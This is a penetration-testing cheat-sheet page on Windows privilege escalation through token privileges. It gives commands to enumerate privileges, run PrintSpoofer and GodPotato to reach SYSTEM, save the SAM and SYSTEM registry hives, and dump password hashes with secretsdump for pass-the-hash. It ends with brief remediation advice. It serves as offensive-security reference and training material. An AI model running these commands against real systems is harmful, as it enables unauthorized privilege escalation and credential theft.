---
tags:
  - Privesc
  - Windows
---

# :material-account-key-outline: Windows Token & Privilege Abuse

<span class="pill pill-hard">service → SYSTEM</span> <span class="pill pill-info">privesc</span>

Windows service accounts often hold privileges that *are* SYSTEM in disguise. Hold `SeImpersonate` or `SeAssignPrimaryToken`? You're one "potato" away from the top.

!!! abstract "TL;DR"
    Run `whoami /priv`. If `SeImpersonatePrivilege` is enabled (common for IIS/MSSQL/service accounts), use a Potato to impersonate SYSTEM.

## :material-magnify: Check your privileges

```powershell
whoami /priv
whoami /groups
```

Dangerous ones: `SeImpersonate`, `SeAssignPrimaryToken`, `SeBackup`, `SeRestore`, `SeDebug`, `SeTakeOwnership`, `SeLoadDriver`.

## :material-french-fries: Impersonation → SYSTEM

```cmd
:: SeImpersonate / SeAssignPrimaryToken
PrintSpoofer.exe -i -c cmd
GodPotato -cmd "cmd /c whoami"
:: older: JuicyPotato / RoguePotato depending on OS build
```

## :material-file-lock: SeBackup / SeRestore

Read any file (bypass ACLs) — grab the SAM & SYSTEM hives, dump hashes offline:

```cmd
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
:: then: impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

!!! loot "Hashes = lateral movement"
    Local admin hash → pass-the-hash across the estate; SYSTEM → LSASS dump for domain creds.

## :material-shield-check: Remediation

- Don't grant service accounts impersonation unless required; use gMSA.
- Restrict backup/restore/debug privileges to genuine admins.

## :material-link-variant: Related

- Core of [Windows Privesc](windows.md); dumped hashes → [Active Directory](../network/active-directory.md).
- Often reached from [MSSQL](../network/mssql.md) `xp_cmdshell`.
- Reference: [HackTricks — Windows Privileges](https://book.hacktricks.wiki/).
